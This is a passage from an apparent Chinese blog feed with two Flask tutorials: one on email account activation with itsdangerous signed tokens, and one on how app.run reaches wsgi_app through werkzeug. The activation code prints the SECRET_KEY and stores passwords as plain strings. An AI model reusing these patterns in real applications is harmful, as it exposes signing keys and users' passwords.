string">'注册成功,请到你邮箱中点击激活!!!'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'users.verification'</span><span class="token punctuation">,</span> name<span class="token operator">=</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>form<span class="token punctuation">.</span>errors<span class="token punctuation">)</span>        <span class="token keyword">return</span>  render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意生成的<code>token</code>,这个<code>token</code>是在<code>sqlModel.py</code>中定义好的.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> exts <span class="token keyword">import</span> db<span class="token comment" spellcheck="true"># 一种加密方式</span><span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> TimedJSONWebSignatureSerializer <span class="token keyword">as</span> Serializer<span class="token keyword">from</span> flask <span class="token keyword">import</span> current_app<span class="token keyword">class</span> <span class="token class-name">Users</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'users'</span>    id <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    username <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    email <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    verification <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Boolean<span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># flag,标识是否注册激活</span>    <span class="token comment" spellcheck="true"># 生成账户激活的token</span>    <span class="token keyword">def</span> <span class="token function">generate_active_token</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> expires_in<span class="token operator">=</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> Serializer<span class="token punctuation">(</span>current_app<span class="token punctuation">.</span>_get_current_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> expires_in<span class="token operator">=</span>expires_in<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>current_app<span class="token punctuation">.</span>_get_current_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>id<span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>itsdangerous</code>主要用来签名和序列化,这个可以后面说,这里简单的理解就是用它来提供一个加密的序列化.</p><p>因为,激活邮件的形式:<code>http://127.0.0.1:5000/users/activate/eyJhbGciOiJI/</code>,我希望它是一堆乱码,只有我自己能够加密解密序列化.所以这里使用了<code>SECRET_KEY</code>.</p><p>同样的,在<code>Flask</code>上下文中,我们使用<code>current_app</code>获取当前使用的<code>app</code>.</p><hr><p><code>activate.html</code></p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Mail<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Hello {{ username }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>激活请点击右边链接，<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>users.activate<span class="token punctuation">'</span>, token<span class="token punctuation">=</span>token, _external<span class="token punctuation">=</span>True) }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>激活<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="5-账户激活"><a href="#5-账户激活" class="headerlink" title="5.账户激活"></a>5.账户激活</h4><blockquote><p>在<code>users.py</code>中设计激活路由</p><pre class="line-numbers language-python"><code class="language-python">@bp<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/activate/&lt;token>/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">activate</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> Users<span class="token punctuation">.</span>check_activate_token<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">'激活成功'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'users.login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">'激活失败'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'users.register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意<code>check_activate_token</code>,是已经设计好的解密<code>token</code></p><p><code>sqlModel.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> exts <span class="token keyword">import</span> db<span class="token comment" spellcheck="true"># 一种加密方式</span><span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> TimedJSONWebSignatureSerializer <span class="token keyword">as</span> Serializer<span class="token keyword">from</span> flask <span class="token keyword">import</span> current_app<span class="token keyword">class</span> <span class="token class-name">Users</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'users'</span>    id <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    username <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    email <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    verification <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Boolean<span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># flag,标识是否注册激活</span>    <span class="token comment" spellcheck="true"># 生成账户激活的token</span>    <span class="token keyword">def</span> <span class="token function">generate_active_token</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> expires_in<span class="token operator">=</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> Serializer<span class="token punctuation">(</span>current_app<span class="token punctuation">.</span>_get_current_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> expires_in<span class="token operator">=</span>expires_in<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>current_app<span class="token punctuation">.</span>_get_current_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>id<span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 账户激活</span>    @staticmethod    <span class="token keyword">def</span> <span class="token function">check_activate_token</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> Serializer<span class="token punctuation">(</span>current_app<span class="token punctuation">.</span>_get_current_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>current_app<span class="token punctuation">.</span>_get_current_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> s<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>token<span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token comment" spellcheck="true"># 得到用户</span>        u <span class="token operator">=</span> Users<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token operator">not</span> u<span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 用户不存在</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">if</span> <span class="token operator">not</span> u<span class="token punctuation">.</span>verification<span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 用户没有激活</span>            u<span class="token punctuation">.</span>verification <span class="token operator">=</span> <span class="token number">1</span>            db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>u<span class="token punctuation">)</span>            db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>它的逻辑也很简单,在我生成<code>token</code>的时候,已经包含了<code>id</code>在内,所以,反向激活的时候,只要验证有没有<code>id</code>在,如果有就把<code>flag</code>变成<code>1</code>,用来标记已经激活过了.需要注意的是一定要用同一个<code>SECRET_KEY</code>.(一个<code>dumps</code>,一个<code>loads</code>).</p></blockquote><h4 id="6-注册并验证"><a href="#6-注册并验证" class="headerlink" title="6.注册并验证"></a>6.注册并验证</h4><blockquote><p>运行后,注册,并查看注册邮箱中有无激活邮件,并尝试激活邮件.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-27/1603806478607-10325.png"></p><p>点击运行后,能正常访问到<code>login</code>页面.</p></blockquote><h4 id="7-代码参考"><a href="#7-代码参考" class="headerlink" title="7.代码参考"></a>7.代码参考</h4><blockquote><p><a href="https://github.com/ningwenyan/demo_code/tree/master/flask_demo_code/T24" target="_blank" rel="noopener">https://github.com/ningwenyan/demo_code/tree/master/flask_demo_code/T24</a></p></blockquote><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> FlaskMail </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask启动流程</title>
      <link href="/posts/20864.html"/>
      <url>/posts/20864.html</url>
      
        <content type="html"><![CDATA[<h2 id="Flask-启动流程"><a href="#Flask-启动流程" class="headerlink" title="Flask 启动流程"></a><code>Flask</code> 启动流程</h2><blockquote><p>请结合<code>Flask</code>上下文一起<a href="https://wenyan.online/2020/10/19/flask-shang-xia-wen/" target="_blank" rel="noopener">阅读</a>:<code>https://wenyan.online/2020/10/19/flask-shang-xia-wen/</code></p></blockquote><blockquote><p><code>Flask</code> 依赖于<code>werkzeug</code> 和<code>jinja</code> 两个核心库,<code>werkzeug</code> 是<code>HTTP</code> 与<code>WSGI</code>相关的包集合.<code>jinja</code> 主要用于渲染前端模板文件.</p><p><code>werkzeug</code> 实现了<code>WSGI</code> 协议,一个典型的<code>WSGI</code> 类似于:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-23/1603461340743-wsgi.png" alt="wsgi"></p><ul><li><code>WSGI</code>:全称<code>Web Server Gateway Interface</code> ,他不是服务器,<code>Python</code> 模块,框架,<code>API</code>,只是一种规范,用来描述<code>web server</code> 如何与<code>web application</code>通信的规范.根据它,可以实现很多的相关框架,比如<code>Flask,Django</code></li><li><code>WSGI server</code> 主要负责从客户端接受<code>request</code> ,并转发给<code>application</code>,<code>application</code> 处理完数据后,<code>WSGI server</code> 在把<code>Response</code> 返回给客户端.</li><li><code>WSGI application</code> 主要是来处理<code>request</code>,它可以包含多个中间件.</li><li><code>environ</code> 指的是一个包含请求信息的对象.</li></ul></blockquote><h3 id="1-Flask-简单应用"><a href="#1-Flask-简单应用" class="headerlink" title="1.Flask 简单应用"></a>1.<code>Flask</code> 简单应用</h3><blockquote><p>一个简单的<code>Flask</code> 服务器如下.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">'This is {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里从<code>app.run()</code> 来一步一步的看,它都执行了什么.</p><pre class="line-numbers language-python"><code class="language-python">app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 定义在 flask/app.py中</span><span class="token keyword">class</span> <span class="token class-name">Flask</span><span class="token punctuation">(</span>_PackageBoundObject<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true"># .....</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token operator">=</span>None<span class="token punctuation">,</span> port<span class="token operator">=</span>None<span class="token punctuation">,</span> debug<span class="token operator">=</span>None<span class="token punctuation">,</span> load_dotenv<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token operator">**</span>options<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># ....</span>  <span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>serving <span class="token keyword">import</span> run_simple  <span class="token keyword">try</span><span class="token punctuation">:</span>      run_simple<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> self<span class="token punctuation">,</span> <span class="token operator">**</span>options<span class="token punctuation">)</span>  <span class="token keyword">finally</span><span class="token punctuation">:</span>      self<span class="token punctuation">.</span>_got_first_request <span class="token operator">=</span> <span class="token boolean">False</span><span class="token comment" spellcheck="true"># 可以看到 run() 方法最重要的是使用了 werkzeug.serving.run_simgle()方法</span><span class="token comment" spellcheck="true"># 查看 run_simple()</span><span class="token comment" spellcheck="true">#  werkzeug.serving.run_simgle()</span><span class="token keyword">def</span> <span class="token function">run_sinple</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true"># ...</span>  srv <span class="token operator">=</span> make_server<span class="token punctuation">(</span>      hostname<span class="token punctuation">,</span>      port<span class="token punctuation">,</span>      application<span class="token punctuation">,</span>      threaded<span class="token punctuation">,</span>      processes<span class="token punctuation">,</span>      request_handler<span class="token punctuation">,</span>      passthrough_errors<span class="token punctuation">,</span>      ssl_context<span class="token punctuation">,</span>      fd<span class="token operator">=</span>fd<span class="token punctuation">,</span>  <span class="token punctuation">)</span><span class="token comment" spellcheck="true">#...</span><span class="token comment" spellcheck="true"># 可以看到这里主要使用了一个 make_server的方法</span><span class="token comment" spellcheck="true"># 此方法也定义在  werkzeug.serving.make_server()</span><span class="token keyword">def</span> <span class="token function">make_server</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true"># ''''''</span><span class="token keyword">if</span> threaded <span class="token operator">and</span> processes <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>  <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"cannot have a multithreaded and multi process server."</span><span class="token punctuation">)</span><span class="token keyword">elif</span> threaded<span class="token punctuation">:</span>  <span class="token keyword">return</span> ThreadedWSGIServer<span class="token punctuation">(</span>      host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> app<span class="token punctuation">,</span> request_handler<span class="token punctuation">,</span> passthrough_errors<span class="token punctuation">,</span> ssl_context<span class="token punctuation">,</span> fd<span class="token operator">=</span>fd  <span class="token punctuation">)</span><span class="token keyword">elif</span> processes <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> ForkingWSGIServer<span class="token punctuation">(</span>      host<span class="token punctuation">,</span>      port<span class="token punctuation">,</span>      app<span class="token punctuation">,</span>      processes<span class="token punctuation">,</span>      request_handler<span class="token punctuation">,</span>      passthrough_errors<span class="token punctuation">,</span>      ssl_context<span class="token punctuation">,</span>      fd<span class="token operator">=</span>fd<span class="token punctuation">,</span>  <span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> BaseWSGIServer<span class="token punctuation">(</span>      host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> app<span class="token punctuation">,</span> request_handler<span class="token punctuation">,</span> passthrough_errors<span class="token punctuation">,</span> ssl_context<span class="token punctuation">,</span> fd<span class="token operator">=</span>fd  <span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 查看 ThreadedWSGIServer,ForkingWSGIServer,BaseWSGIServer</span><span class="token comment" spellcheck="true"># 这三个方法同样定义在  werkzeug.serving.BaseWSGIServer</span><span class="token keyword">class</span> <span class="token class-name">ThreadedWSGIServer</span><span class="token punctuation">(</span>ThreadingMixIn<span class="token punctuation">,</span> BaseWSGIServer<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">pass</span><span class="token keyword">class</span> <span class="token class-name">ForkingWSGIServer</span><span class="token punctuation">(</span>ForkingMixIn<span class="token punctuation">,</span> BaseWSGIServer<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">pass</span><span class="token keyword">class</span> <span class="token class-name">BaseWSGIServer</span><span class="token punctuation">(</span>HTTPServer<span class="token punctuation">,</span> object<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">pass</span><span class="token comment" spellcheck="true"># 可以看到最主要的类是 BaseWSGIServer</span><span class="token keyword">class</span> <span class="token class-name">BaseWSGIServer</span><span class="token punctuation">(</span>HTTPServer<span class="token punctuation">,</span> object<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token triple-quoted-string string">"""Simple single-threaded, single-process WSGI server."""</span>multithread <span class="token operator">=</span> <span class="token boolean">False</span>multiprocess <span class="token operator">=</span> <span class="token boolean">False</span>request_queue_size <span class="token operator">=</span> LISTEN_QUEUE<span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>  self<span class="token punctuation">,</span>  host<span class="token punctuation">,</span>  port<span class="token punctuation">,</span>  app<span class="token punctuation">,</span>  handler<span class="token operator">=</span>None<span class="token punctuation">,</span>  passthrough_errors<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>  ssl_context<span class="token operator">=</span>None<span class="token punctuation">,</span>  fd<span class="token operator">=</span>None<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> handler <span class="token keyword">is</span> None<span class="token punctuation">:</span>    handler <span class="token operator">=</span> WSGIRequestHandlerHTTPServer<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> server_address<span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># ....</span><span class="token comment" spellcheck="true"># 这里使用了最重要的一个类   WSGIRequestHandler         </span><span class="token comment" spellcheck="true"># 这个类也定义在 werkzeug.serving.WSGIRequestHandler</span><span class="token keyword">class</span> <span class="token class-name">WSGIRequestHandler</span><span class="token punctuation">(</span>BaseHTTPRequestHandler<span class="token punctuation">,</span> object<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true"># ...</span><span class="token keyword">def</span> <span class="token function">execute</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">:</span>  application_iter <span class="token operator">=</span> app<span class="token punctuation">(</span>environ<span class="token punctuation">,</span> start_response<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># ...</span><span class="token keyword">try</span><span class="token punctuation">:</span>    execute<span class="token punctuation">(</span>self<span class="token punctuation">.</span>server<span class="token punctuation">.</span>app<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># ...</span><span class="token comment" spellcheck="true"># 可以看到这个类最主要就是执行了 execute(app) 这个方法,而根据传递 这里的</span><span class="token comment" spellcheck="true"># app 就是最开始生成的app=Flask(__name__)</span><span class="token comment" spellcheck="true"># 执行到最后相当于执行 app() 这个函数</span><span class="token comment" spellcheck="true"># 找到 flask/app.py 下的 Flask.__call__</span><span class="token keyword">class</span> <span class="token class-name">Flask</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#...</span><span class="token keyword">def</span> <span class="token function">wsgi_app</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> environ<span class="token punctuation">,</span> start_response<span class="token punctuation">)</span><span class="token punctuation">:</span>  ctx <span class="token operator">=</span> self<span class="token punctuation">.</span>request_context<span class="token punctuation">(</span>environ<span class="token punctuation">)</span>  error <span class="token operator">=</span> None  <span class="token keyword">try</span><span class="token punctuation">:</span>      <span class="token keyword">try</span><span class="token punctuation">:</span>          ctx<span class="token punctuation">.</span>push<span class="token punctuation">(</span><span class="token punctuation">)</span>          response <span class="token operator">=</span> self<span class="token punctuation">.</span>full_dispatch_request<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>          error <span class="token operator">=</span> e          response <span class="token operator">=</span> self<span class="token punctuation">.</span>handle_exception<span class="token punctuation">(</span>e<span class="token punctuation">)</span>      <span class="token keyword">except</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># noqa: B001</span>          error <span class="token operator">=</span> sys<span class="token punctuation">.</span>exc_info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>          <span class="token keyword">raise</span>      <span class="token keyword">return</span> response<span class="token punctuation">(</span>environ<span class="token punctuation">,</span> start_response<span class="token punctuation">)</span>  <span class="token keyword">finally</span><span class="token punctuation">:</span>      <span class="token keyword">if</span> self<span class="token punctuation">.</span>should_ignore_error<span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>          error <span class="token operator">=</span> None      ctx<span class="token punctuation">.</span>auto_pop<span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">__call__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> environ<span class="token punctuation">,</span> start_response<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> self<span class="token punctuation">.</span>wsgi_app<span class="token punctuation">(</span>environ<span class="token punctuation">,</span> start_response<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 最终的逻辑定义在    Flask.wsgi_app()中.</span><span aria-hidden="true" 